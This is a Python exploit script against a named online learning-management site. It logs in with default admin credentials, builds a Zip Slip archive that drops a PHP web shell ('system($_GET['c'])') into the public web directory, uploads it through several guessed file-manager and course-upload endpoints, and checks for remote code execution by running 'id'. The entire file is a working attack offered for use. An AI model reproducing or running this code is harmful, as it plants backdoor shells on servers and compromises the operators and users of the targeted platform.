import requests
import zipfile
import io
import re
import time

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def create_zipslip_payload():
    """Create a ZIP with directory traversal to place shell in public/"""
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as z:
        # Zip Slip: traverse up from storage/uploads to public/
        # Typical path: storage/uploads/files/ -> need ../../../public/
        shell_code = "<?php system($_GET['c']); ?>"
        
        # Try multiple traversal depths
        for depth in range(3, 8):
            traversal = "../" * depth
            shell_path = f"{traversal}public/rce_{depth}.php"
            z.writestr(shell_path, shell_code)
            print(f"    [+] Added: {shell_path}")
    
    zip_buffer.seek(0)
    return zip_buffer

def exploit_file_manager():
    print("\n[*] Attempting RCE via File Manager ZIP Upload (Zip Slip)...")
    
    # File Manager upload endpoint (Laravel File Manager - LFM)
    # Common paths: /panel/files/upload, /admin/files/upload
    upload_endpoints = [
        "/panel/files/upload",
        "/admin/files/upload", 
        "/laravel-filemanager/upload",
        "/panel/files/store"
    ]
    
    zip_payload = create_zipslip_payload()
    
    for endpoint in upload_endpoints:
        print(f"\n[*] Trying endpoint: {endpoint}")
        
        try:
            # Get CSRF token from file manager page
            fm_page = endpoint.replace("/upload", "").replace("/store", "")
            r = session.get(f"{BASE_URL}{fm_page}")
            csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
            
            if not csrf:
                csrf = re.search(r'"csrf-token" content="([^"]+)"', r.text)
            
            token = csrf.group(1) if csrf else ""
            
            files = {
                'upload': ('payload.zip', zip_payload, 'application/zip')
            }
            
            data = {
                '_token': token,
                'working_dir': '/',
                'type': 'file'
            }
            
            r = session.post(f"{BASE_URL}{endpoint}", files=files, data=data, allow_redirects=False)
            print(f"    Status: {r.status_code}")
            
            if r.status_code in [200, 201, 302]:
                print(f"    [+] Upload successful! Checking for shells...")
                
                # Check if shells were extracted
                time.sleep(2)
                for depth in range(3, 8):
                    shell_url = f"{BASE_URL}/rce_{depth}.php?c=id"
                    try:
                        test = session.get(shell_url, timeout=5)
                        if test.status_code == 200 and ("uid=" in test.text or "www-data" in test.text):
                            print(f"\n[!!!] RCE SUCCESS!")
                            print(f"[!!!] Shell URL: {shell_url}")
                            print(f"[!!!] Output: {test.text.strip()}")
                            return True
                    except:
                        pass
                        
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

def exploit_course_upload():
    print("\n[*] Attempting RCE via Course File Upload...")
    
    # First, create a course or find existing one
    try:
        # Get courses list
        r = session.get(f"{BASE_URL}/panel/webinars")
        
        # Look for existing course ID
        course_match = re.search(r'/panel/webinars/(\d+)/edit', r.text)
        
        if course_match:
            course_id = course_match.group(1)
            print(f"    [+] Found existing course ID: {course_id}")
            
            # Try to upload file to this course
            upload_url = f"{BASE_URL}/panel/files/store"
            
            zip_payload = create_zipslip_payload()
            
            files = {
                'file': ('course_material.zip', zip_payload, 'application/zip')
            }
            
            data = {
                'webinar_id': course_id,
                'file_type': 'attachment'
            }
            
            r = session.post(upload_url, files=files, data=data)
            print(f"    Upload Status: {r.status_code}")
            
            if r.status_code == 200:
                # Check for extracted shells
                time.sleep(2)
                for depth in range(3, 8):
                    shell_url = f"{BASE_URL}/rce_{depth}.php?c=id"
                    try:
                        test = session.get(shell_url, timeout=5)
                        if test.status_code == 200 and "uid=" in test.text:
                            print(f"\n[!!!] RCE SUCCESS via Course Upload!")
                            print(f"[!!!] Shell URL: {shell_url}")
                            print(f"[!!!] Output: {test.text.strip()}")
                            return True
                    except:
                        pass
                        
    except Exception as e:
        print(f"    Error: {e}")
    
    return False

def main():
    if not login():
        return
    
    # Try multiple RCE vectors
    if exploit_file_manager():
        return
    
    if exploit_course_upload():
        return
    
    print("\n[-] All RCE vectors failed or blocked.")
    print("[*] Recommendation: Manual inspection of available upload features in admin panel.")

if __name__ == "__main__":
    main()
